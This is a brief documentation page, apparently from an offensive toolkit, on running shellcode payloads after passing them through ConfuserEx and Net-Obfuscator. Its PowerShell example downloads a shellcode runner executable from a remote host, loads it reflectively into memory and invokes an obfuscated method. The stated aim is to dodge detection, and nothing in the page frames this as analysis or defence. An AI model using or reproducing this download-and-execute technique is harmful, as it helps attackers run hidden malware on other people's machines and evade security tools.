---
title: "ConfuserEx + Net-Obfuscator"
description: "Double-obfuscated shellcode runners."
---

Payloads from `payloads/XOR/` and `payloads/Caesar/` are fed through **ConfuserEx** then **Net-Obfuscator**, dynamically obfuscating `GetType` and `GetMethod` values.

## Reflective Execution Example

```powershell
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe')
$ass=[System.Reflection.Assembly]::Load($data)
$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
```

<Note>
The type and method names are randomized per generation.
</Note>
